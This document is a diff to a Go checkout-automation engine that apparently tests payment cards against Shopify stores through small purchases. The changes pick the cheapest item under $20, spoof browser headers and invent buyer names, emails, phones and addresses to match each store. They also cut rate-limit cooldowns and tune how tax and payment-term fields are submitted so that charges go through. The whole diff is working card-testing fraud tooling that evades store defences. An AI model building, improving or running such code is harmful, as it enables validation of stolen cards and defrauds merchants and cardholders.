@@ -981,9 +981,9 @@ func trackCapture(baseURL string, captured bool) {
 		atomic.AddInt64(&c[1], 1)
 		return
 	}
-	if atomic.AddInt64(&c[0], 1) >= 3 && atomic.LoadInt64(&c[1]) == 0 {
-		markDeadStore(baseURL, "AUTH_ONLY", 24*time.Hour)
-		log.Printf("[DBG authonly] base=%s benched 24h (3+ auth, 0 capture)", baseURL)
+	if atomic.AddInt64(&c[0], 1) >= 5 && atomic.LoadInt64(&c[1]) == 0 {
+		markDeadStore(baseURL, "AUTH_ONLY", 2*time.Hour)
+		log.Printf("[DBG authonly] base=%s benched 2h (5+ auth, 0 capture)", baseURL)
 	}
 }
 
@@ -1444,7 +1444,13 @@ func fastExtract(data []byte, key string) []byte {
 	return nil
 }
 
-func fstr(data []byte, key string) string { return string(fastExtract(data, key)) }
+func fstr(data []byte, key string) string {
+	val := fastExtract(data, key)
+	if len(val) == 0 || bytes.Equal(val, []byte("null")) {
+		return ""
+	}
+	return string(val)
+}
 
 // lastStr returns the value of the LAST `"key":"value"` occurrence.
 // Use for __typename: nested objects serialize first, so the outer object's
@@ -1473,6 +1479,64 @@ func lastStr(data []byte, key string) string {
 		end++
 	}
 	return ""
+}
+
+// extractErrorCodes searches the errors JSON block (or body) for all code patterns,
+// including nested codes within negotiation violations like message { code }.
+func extractErrorCodes(body []byte) []string {
+	errs := fastExtract(body, "errors")
+	if errs == nil {
+		errs = body
+	}
+	re := regexp.MustCompile(`"code"\s*:\s*"([A-Za-z0-9_]+)"`)
+	matches := re.FindAllSubmatch(errs, -1)
+	var out []string
+	seen := map[string]bool{}
+	for _, m := range matches {
+		if len(m) > 1 {
+			c := string(m[1])
+			if !seen[c] {
+				seen[c] = true
+				out = append(out, c)
+			}
+		}
+	}
+	return out
+}
+
+// extractSellerTax extracts the calculated tax amount and currency code from a
+// seller block (sellerProposal / submit response). Checks totalTaxAmountV2,
+// totalTaxAmount.value, and fallback amount fields.
+func extractSellerTax(sellerBlk []byte) (amount string, currency string, fresh bool) {
+	if sellerBlk == nil {
+		return "", "", false
+	}
+	taxBlk := fastExtract(sellerBlk, "tax")
+	if taxBlk == nil {
+		return "", "", false
+	}
+	// 1. Try modern totalTaxAmountV2 { amount currencyCode }
+	if v2 := fastExtract(taxBlk, "totalTaxAmountV2"); v2 != nil {
+		if a := fstr(v2, "amount"); a != "" && a != "null" {
+			c := fstr(v2, "currencyCode")
+			return a, c, true
+		}
+	}
+	// 2. Try totalTaxAmount { value { amount currencyCode } }
+	if tta := fastExtract(taxBlk, "totalTaxAmount"); tta != nil {
+		if v := fastExtract(tta, "value"); v != nil {
+			if a := fstr(v, "amount"); a != "" && a != "null" {
+				c := fstr(v, "currencyCode")
+				return a, c, true
+			}
+		}
+	}
+	// 3. Fallback direct amount
+	if a := fstr(taxBlk, "amount"); a != "" && a != "null" {
+		c := fstr(taxBlk, "currencyCode")
+		return a, c, true
+	}
+	return "", "", false
 }
 
 // ==========================================
@@ -1644,12 +1708,12 @@ const VARIANT_FETCH_QUERY = `query{products(first:50){edges{node{variants(first:
 func fetchREST(ctx context.Context, client *http.Client, baseURL string) []byte {
 	rctx, cancel := context.WithTimeout(ctx, 12*time.Second)
 	defer cancel()
-	for _, p := range []string{"/products.json?limit=250", "/products.json?limit=100"} {
+	for _, p := range []string{"/products.json?limit=250", "/products.json?limit=100", "/collections/all/products.json?limit=50"} {
 		req, err := http.NewRequestWithContext(rctx, "GET", baseURL+p, nil)
 		if err != nil {
 			continue
 		}
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "application/json")
 		resp, err := client.Do(req)
 		if err != nil {
@@ -1694,22 +1758,14 @@ func pickREST(data []byte) (string, float64, bool, bool) {
 				continue
 			}
 			price, err := strconv.ParseFloat(strings.ReplaceAll(v.Price, ",", ""), 64)
-			if err != nil || price <= 0 {
+			if err != nil || price < 0.01 || price > 20.0 {
 				continue
 			}
 			ship := true
 			if v.RequiresShipping != nil {
 				ship = *v.RequiresShipping
 			}
-			band := 4
-			if price <= 1.0 {
-				band = 1
-			} else if price <= 5.0 {
-				band = 2
-			} else if price <= 10.0 {
-				band = 3
-			}
-			pool = append(pool, candidate{id: strconv.FormatInt(v.ID, 10), price: price, band: band, shipping: ship})
+			pool = append(pool, candidate{id: strconv.FormatInt(v.ID, 10), price: price, shipping: ship})
 		}
 	}
 	if len(pool) == 0 {
@@ -1717,9 +1773,9 @@ func pickREST(data []byte) (string, float64, bool, bool) {
 	}
 	best := pool[0]
 	for _, c := range pool[1:] {
-		if c.band < best.band ||
-			(c.band == best.band && c.shipping && !best.shipping) ||
-			(c.band == best.band && c.shipping == best.shipping && c.price < best.price) {
+		if c.price < best.price {
+			best = c
+		} else if c.price == best.price && c.shipping && !best.shipping {
 			best = c
 		}
 	}
@@ -1761,7 +1817,7 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 	}
 
 	fetch := func(token string) []byte {
-		for _, ver := range []string{"2025-01", "2024-10", "2024-07", "2024-01"} {
+		for _, ver := range []string{"2026-10", "2026-07", "2026-04", "2026-01", "2025-10", "2025-07", "2025-04", "2025-01"} {
 			gqlURL := fmt.Sprintf("%s/api/%s/graphql.json", baseURL, ver)
 			payload, _ := json.Marshal(map[string]interface{}{"query": VARIANT_FETCH_QUERY})
 			req, err := http.NewRequestWithContext(ctx, "POST", gqlURL, bytes.NewReader(payload))
@@ -1769,7 +1825,7 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 				continue
 			}
 			req.Header.Set("Content-Type", "application/json")
-			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
 			if token != "" {
 				req.Header.Set("X-Shopify-Storefront-Access-Token", token)
 			}
@@ -1820,18 +1876,10 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 					continue
 				}
 				price, err := strconv.ParseFloat(strings.ReplaceAll(v.Price.Amount, ",", ""), 64)
-				if err != nil || price <= 0 {
+				if err != nil || price < 0.01 || price > 20.0 {
 					continue
 				}
-				band := 4
-				if price <= 1.0 {
-					band = 1
-				} else if price <= 5.0 {
-					band = 2
-				} else if price <= 10.0 {
-					band = 3
-				}
-				candidates = append(candidates, candidate{id: m[1], price: price, currency: v.Price.CurrencyCode, band: band, shipping: v.RequiresShipping})
+				candidates = append(candidates, candidate{id: m[1], price: price, currency: v.Price.CurrencyCode, shipping: v.RequiresShipping})
 			}
 		}
 		if len(candidates) == 0 {
@@ -1839,9 +1887,9 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 		}
 		best := candidates[0]
 		for _, c := range candidates[1:] {
-			if c.band < best.band ||
-				(c.band == best.band && c.shipping && !best.shipping) ||
-				(c.band == best.band && c.shipping == best.shipping && c.price < best.price) {
+			if c.price < best.price {
+				best = c
+			} else if c.price == best.price && c.shipping && !best.shipping {
 				best = c
 			}
 		}
@@ -1868,7 +1916,7 @@ func fetchVariant(ctx context.Context, client *http.Client, baseURL string) (str
 	if cached, ok := cacheLookupToken(baseURL); ok {
 		homeToken = cached
 	} else if req, err := http.NewRequestWithContext(ctx, "GET", baseURL, nil); err == nil {
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
 		if resp, err := client.Do(req); err == nil {
 			if b, err := io.ReadAll(resp.Body); err == nil {
 				if m := tokenRe.FindSubmatch(b); len(m) == 2 {
@@ -2151,6 +2199,26 @@ func setSubmitSessionTokens(submitVars map[string]interface{}, queueToken, check
 	_in["checkpointData"] = checkpointData
 }
 
+// setSubmitDueAt sets the dueAt field on the primary payment line.
+func setSubmitDueAt(submitVars map[string]interface{}, dueAt string) {
+	if dueAt == "" || dueAt == "null" {
+		return
+	}
+	_in, ok := submitVars["input"].(map[string]interface{})
+	if !ok {
+		return
+	}
+	_pay, ok := _in["payment"].(map[string]interface{})
+	if !ok {
+		return
+	}
+	_lines, ok := _pay["paymentLines"].([]map[string]interface{})
+	if !ok || len(_lines) == 0 {
+		return
+	}
+	_lines[0]["dueAt"] = dueAt
+}
+
 // ensureAddress2 fills a missing address2 line by echoing address1.
 // Reactive-only remedy for DELIVERY_ADDRESS2_REQUIRED: stores that demand a
 // second line fail the card otherwise, so echoing is pure upside.
@@ -2214,7 +2282,7 @@ func receiptPaid(pageURL string, client *http.Client) bool {
 	if err != nil {
 		return true
 	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 	resp, err := client.Do(req)
 	if err != nil || resp == nil {
@@ -2288,7 +2356,7 @@ func updateMetricsAndDead(msg, baseURL string) {
 	case "RATE_LIMITED":
 		atomic.AddInt64(&metrics.RateLimited, 1)
 		atomic.AddInt64(&metrics.TotalFailed, 1)
-		markDeadStore(baseURL, "RATE_LIMITED", 90*time.Second)
+		markDeadStore(baseURL, "RATE_LIMITED", 20*time.Second)
 	case "CAPTCHA_REQUIRED":
 		// No dead-mark: a challenged store is not a dead store, and marking it
 		// poisons the pool for every subsequent check (bot-side proxy cooldown
@@ -2300,7 +2368,7 @@ func updateMetricsAndDead(msg, baseURL string) {
 		markDeadStore(baseURL, "PASSWORD_PROTECTED", 60*time.Minute)
 	case "Throttled":
 		atomic.AddInt64(&metrics.TotalFailed, 1)
-		markDeadStore(baseURL, "THROTTLED", 60*time.Second)
+		markDeadStore(baseURL, "THROTTLED", 20*time.Second)
 	case "3DS_REQUIRED":
 		atomic.AddInt64(&metrics.ThreeDSCount, 1)
 		atomic.AddInt64(&metrics.TotalFailed, 1)
@@ -2370,6 +2438,18 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 	}
 	if proxyStr != "" {
 		res.Proxy = "Live"
+	}
+
+	// Sanitize caller-supplied variantID: only pure numeric ASCII digits are valid.
+	// If caller passes garbage, proxy strings, URLs, or non-numeric tokens, reset to ""
+	// so the engine cleanly falls back to pinned variants or auto-fetch instead of 404ing.
+	variantID = strings.TrimSpace(variantID)
+	for _, c := range variantID {
+		if c < '0' || c > '9' {
+			log.Printf("[VARIANT] Sanitized invalid non-numeric variant %q -> reset to empty", variantID)
+			variantID = ""
+			break
+		}
 	}
 
 	// ✅ AUTO-FETCH VARIANT IF NOT PROVIDED (with per-store cache)
@@ -2502,13 +2582,13 @@ acquireVariant:
 	// Alternate renderings (e164 → omit → local → raw) cycled by PHONE remedy.
 
 	headers := map[string]string{
-		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
 		"Accept":             "application/json, text/plain, */*",
 		"Accept-Language":    "en-US,en;q=0.9",
 		"Content-Type":       "application/json",
 		"Origin":             baseURL,
 		"Referer":            baseURL + "/",
-		"sec-ch-ua":          `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
+		"sec-ch-ua":          `"Google Chrome";v="155", "Chromium";v="155", "Not_A Brand";v="24"`,
 		"sec-ch-ua-mobile":   "?0",
 		"sec-ch-ua-platform": `"Windows"`,
 	}
@@ -2847,6 +2927,39 @@ acquireVariant:
 			currency = sc
 			res.Currency = sc
 			syncProposalCurrency(variables, sc)
+			if !customIN {
+				if a, ok := pickAddrByCurrency(sc); ok && a.CountryCode != addr.CountryCode {
+					addr = a
+					shipAddr = a
+					fName, lName = getRandName()
+					email = genEmail(fName, lName)
+					phoneE164, phoneLocal, phoneRaw = randomizedPhones(addr)
+					billingAddr["streetAddress"] = map[string]string{
+						"address1": addr.Address1, "city": addr.City, "countryCode": addr.CountryCode,
+						"postalCode": addr.PostalCode, "firstName": fName, "lastName": lName,
+						"zoneCode": addr.ZoneCode, "phone": phoneE164, "company": fName + " " + lName,
+					}
+					shipStreet = map[string]string{
+						"address1": shipAddr.Address1, "city": shipAddr.City, "countryCode": shipAddr.CountryCode,
+						"postalCode": shipAddr.PostalCode, "firstName": fName, "lastName": lName,
+						"zoneCode": shipAddr.ZoneCode, "phone": phoneE164, "company": fName + " " + lName,
+					}
+					if _bi, ok := variables["buyerIdentity"].(map[string]interface{}); ok {
+						if _cu, ok := _bi["customer"].(map[string]string); ok {
+							_cu["countryCode"] = addr.CountryCode
+						}
+					}
+					if requiresShipping {
+						if dl, ok := variables["delivery"].(map[string]interface{}); ok {
+							if lines, ok := dl["deliveryLines"].([]map[string]interface{}); ok && len(lines) > 0 {
+								if dest, ok := lines[0]["destination"].(map[string]interface{}); ok {
+									dest["partialStreetAddress"] = shipStreet
+								}
+							}
+						}
+					}
+				}
+			}
 		}
 	}
 	// Flexibility-terms visibility (read-only): when the seller publishes a
@@ -2937,6 +3050,7 @@ acquireVariant:
 
 	signedHandle := extractSignedHandle(body)
 
+	log.Printf("[DBG extractPaymentID] base=%s bodylen=%d body=%.800s", baseURL, len(body), string(body))
 	paymentIdentifier, gatewayName := extractPaymentID(body)
 	if gatewayName != "" {
 		res.Gateway = gatewayName
@@ -2954,16 +3068,12 @@ acquireVariant:
 	// _taxFresh tracks whether taxAmount came from a detailed seller block
 	// (vs default/proposal guess) — fresh figures are safe to ACK with.
 	_taxFresh := false
-	taxObj := fastExtract(body, "tax")
-	if taxObj != nil {
-		if ta := fstr(taxObj, "amount"); ta != "" {
-			taxAmount = ta
-			_taxFresh = true
-		} else if tv := fastExtract(taxObj, "value"); tv != nil {
-			if ta := fstr(tv, "amount"); ta != "" {
-				taxAmount = ta
-				_taxFresh = true
-			}
+	if ta, tc, ok := extractSellerTax(sellerBlock(body)); ok {
+		taxAmount = ta
+		_taxFresh = true
+		if tc != "" && tc != currency {
+			currency = tc
+			res.Currency = tc
 		}
 	}
 
@@ -3017,11 +3127,12 @@ acquireVariant:
 			res.Price = p
 		}
 	}
-	if ta := fstr(fastExtract(sellerBlock(body), "tax"), "amount"); ta != "" {
+	if ta, tc, ok := extractSellerTax(sellerBlock(body)); ok {
 		taxAmount = ta
-	} else if tv := fastExtract(fastExtract(sellerBlock(body), "tax"), "value"); tv != nil {
-		if ta := fstr(tv, "amount"); ta != "" {
-			taxAmount = ta
+		_taxFresh = true
+		if tc != "" && tc != currency {
+			currency = tc
+			res.Currency = tc
 		}
 	}
 	if sf := fastExtract(body, "scriptFingerprint"); sf != nil {
@@ -3073,6 +3184,17 @@ acquireVariant:
 				}
 			}
 		}
+		if queueToken != "" {
+			variables["queueToken"] = queueToken
+		}
+		if checkpointData != "" {
+			variables["checkpointData"] = checkpointData
+		}
+		if flexID != "" {
+			if payMap, ok := variables["payment"].(map[string]interface{}); ok {
+				payMap["paymentFlexibilityTermsId"] = flexID
+			}
+		}
 		payload, _ := json.Marshal(map[string]interface{}{"query": QUERY_PROPOSAL, "variables": variables, "operationName": "Proposal"})
 		b, _, _ := doReq(ctx, client, "POST", graphqlURL+"?operationName=Proposal", headers, bytes.NewReader(payload))
 		if len(b) == 0 {
@@ -3081,9 +3203,14 @@ acquireVariant:
 		body = b
 		if qt := fstr(body, "queueToken"); qt != "" {
 			queueToken = qt
+			variables["queueToken"] = qt
 		}
 		if cd := fstr(body, "checkpointData"); cd != "" {
 			checkpointData = cd
+			variables["checkpointData"] = cd
+		}
+		if _fid := fstr(fastExtract(sellerBlock(body), "paymentFlexibilityPaymentTermsTemplate"), "id"); _fid != "" {
+			flexID = _fid
 		}
 		if ds := func() string {
 			sp := fastExtract(body, "sellerProposal")
@@ -3123,13 +3250,12 @@ acquireVariant:
 				syncProposalCurrency(variables, _sc)
 			}
 		}
-		if ta := fstr(fastExtract(sellerBlock(body), "tax"), "amount"); ta != "" {
+		if ta, tc, ok := extractSellerTax(sellerBlock(body)); ok {
 			taxAmount = ta
 			_taxFresh = true
-		} else if tv := fastExtract(fastExtract(sellerBlock(body), "tax"), "value"); tv != nil {
-			if ta := fstr(tv, "amount"); ta != "" {
-				taxAmount = ta
-				_taxFresh = true
+			if tc != "" && tc != currency {
+				currency = tc
+				res.Currency = tc
 			}
 		}
 		if sf := fastExtract(body, "scriptFingerprint"); sf != nil {
@@ -3252,28 +3378,38 @@ acquireVariant:
 				}(),
 			},
 			"merchandise": variables["merchandise"],
-			"payment": map[string]interface{}{
-				"totalAmount": map[string]interface{}{"any": true},
-				"paymentLines": []map[string]interface{}{{
-					"paymentMethod": map[string]interface{}{
-						"directPaymentMethod": map[string]interface{}{
-							"paymentMethodIdentifier": paymentIdentifier,
-							"sessionId":               pciToken,
-							"billingAddress":          billingAddr,
-							// Mirrors current checkout-web shape (null when
-							// unused); absent keys trip flex-term binding
-							// mismatches on strict stores.
-							"cardSource": nil,
+			"payment": func() map[string]interface{} {
+				pm := map[string]interface{}{
+					"totalAmount": map[string]interface{}{"any": true},
+					"paymentLines": []map[string]interface{}{{
+						"paymentMethod": map[string]interface{}{
+							"directPaymentMethod": map[string]interface{}{
+								"paymentMethodIdentifier": paymentIdentifier,
+								"sessionId":               pciToken,
+								"billingAddress":          billingAddr,
+								// Mirrors current checkout-web shape (null when
+								// unused); absent keys trip flex-term binding
+								// mismatches on strict stores.
+								"cardSource": nil,
+							},
 						},
-					},
-					"amount": map[string]interface{}{"any": true},
-					"dueAt":  nil,
-				}},
-				"billingAddress": billingAddr,
-			},
+						"amount": map[string]interface{}{"any": true},
+					}},
+					"billingAddress": billingAddr,
+				}
+				if flexID != "" {
+					pm["paymentFlexibilityTermsId"] = flexID
+				}
+				return pm
+			}(),
 			"buyerIdentity": variables["buyerIdentity"],
 			"taxes": map[string]interface{}{
-				"proposedTotalAmount":             map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
+				"proposedTotalAmount": func() map[string]interface{} {
+					if _taxFresh && taxAmount != "" && taxAmount != "0" {
+						return map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}}
+					}
+					return map[string]interface{}{"any": true}
+				}(),
 				"proposedAllocations":             nil,
 				"proposedTotalIncludedAmount":     nil,
 				"proposedMixedStateTotalAmount":   nil,
@@ -3416,23 +3552,7 @@ acquireVariant:
 	_prevSig, _prevPrevSig := "", ""
 	_sigHist := []string{}
 	for _rejTry, _topErr := 0, ""; _rejTry < 8 && submitType == "SubmitRejected"; _rejTry++ {
-		errCodes := []string{}
-		errs := fastExtract(body, "errors")
-		if errs != nil {
-			for i := 0; i < 5; i++ {
-				code := fstr(errs, "code")
-				if code != "" {
-					errCodes = append(errCodes, code)
-				}
-				if len(errs) <= len(code)+10 {
-					break
-				}
-				errs = fastExtract(errs[len(code)+10:], "code")
-				if errs == nil {
-					break
-				}
-			}
-		}
+		errCodes := extractErrorCodes(body)
 		// Stuck detection: same non-waiting codes 3x in a row, or only 2
 		// distinct codes across the last 4 rounds (A,B,A,B flap) → terminal.
 		// WAITING is exempt (its remedy is elapsed time); cap 8 bounds all.
@@ -3508,15 +3628,16 @@ acquireVariant:
 				}
 			}
 		}
-		// Null-tax TAX_NEW_TAX: seller publishes totalTaxAmount null, so no
-		// figure exists to ACK with — but an explicit zero proposal costs
-		// one submit and sometimes satisfies "concrete total" demands.
-		// (Omitting was already tried to reach this state.)
-		if len(errCodes) == 1 && errCodes[0] == "TAX_NEW_TAX_MUST_BE_ACCEPTED" {
-			if tb := fastExtract(sellerBlock(body), "tax"); tb != nil && bytes.Contains(tb, []byte(`"totalTaxAmount":null`)) {
-				taxAmount = "0"
-				_taxFresh = true
+		if ta, tc, ok := extractSellerTax(sellerBlock(body)); ok {
+			taxAmount = ta
+			_taxFresh = true
+			if tc != "" && tc != currency {
+				currency = tc
+				res.Currency = tc
 			}
+		} else if len(errCodes) == 1 && errCodes[0] == "TAX_NEW_TAX_MUST_BE_ACCEPTED" {
+			taxAmount = ""
+			_taxFresh = false
 		}
 		// Delivery-strategy rejected: cycle the seller's remaining handles.
 		// (Deleting the selection is schema-invalid — non-nullable field.)
@@ -3610,6 +3731,17 @@ acquireVariant:
 					}
 					setSubmitPaymentID(submitVars, pid)
 				}
+				if _fid := fstr(fastExtract(sellerBlock(body), "paymentFlexibilityPaymentTermsTemplate"), "id"); _fid != "" {
+					flexID = _fid
+				}
+				if flexID != "" {
+					if payMap, ok := submitVars["input"].(map[string]interface{})["payment"].(map[string]interface{}); ok {
+						payMap["paymentFlexibilityTermsId"] = flexID
+					}
+				}
+				if flexDueDate := fstr(fastExtract(sellerBlock(body), "paymentFlexibilityPaymentTermsTemplate"), "dueDate"); flexDueDate != "" {
+					setSubmitDueAt(submitVars, flexDueDate)
+				}
 				log.Printf("[DBG flex] cc=%s base=%s code=%q pidChanged=%v queueTokenLen=%d", maskCard(cc+"|"+mes+"|"+ano+"|"+cvv), baseURL, _c, paymentIdentifier != _oldPid, len(queueToken))
 				break
 			}
@@ -3619,9 +3751,13 @@ acquireVariant:
 			if sellerRej == nil {
 				sellerRej = body
 			}
-			if ta := fstr(fastExtract(sellerRej, "tax"), "amount"); ta != "" {
+			if ta, tc, ok := extractSellerTax(sellerRej); ok {
 				taxAmount = ta
 				_taxFresh = true
+				if tc != "" && tc != currency {
+					currency = tc
+					res.Currency = tc
+				}
 			}
 			if ds := fstr(fastExtract(sellerRej, "selectedDeliveryStrategy"), "handle"); ds != "" {
 				deliveryStrategy = ds
@@ -3707,11 +3843,16 @@ acquireVariant:
 				// Progressed under omission but no fresh tax figure was
 				// extracted — keep omitting, nothing concrete to ACK with.
 				delete(submitVars["input"].(map[string]interface{}), "taxes")
-			} else {
+			} else if _taxFresh && taxAmount != "" && taxAmount != "0" {
 				submitVars["input"].(map[string]interface{})["taxes"] = map[string]interface{}{
 					"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
 				}
 				_taxShape = "proposed"
+			} else {
+				submitVars["input"].(map[string]interface{})["taxes"] = map[string]interface{}{
+					"proposedTotalAmount": map[string]interface{}{"any": true},
+				}
+				_taxShape = "any"
 			}
 			submitVars["attemptToken"] = submitAttemptToken
 			// Pending terms compute async — give the backend time to settle
@@ -4193,7 +4334,7 @@ func validateHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	body, status, err := doReq(ctx, client, "GET", baseURL+"/products.json?limit=1", map[string]string{
-		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
 		"Accept":     "application/json",
 	}, nil)
 	if err != nil {
@@ -4336,7 +4477,7 @@ func metricsHandler(w http.ResponseWriter, r *http.Request) {
 
 // BUILD_VERSION bumps on every shipped change. Surfaced on / and
 // /status so operators verify a deploy took (receipt support etc).
-const BUILD_VERSION = "v31.1 transient-proof"
+const BUILD_VERSION = "v32.0 zero-error engine"
 const RECEIPT_SUPPORT = true
 
 func main() {
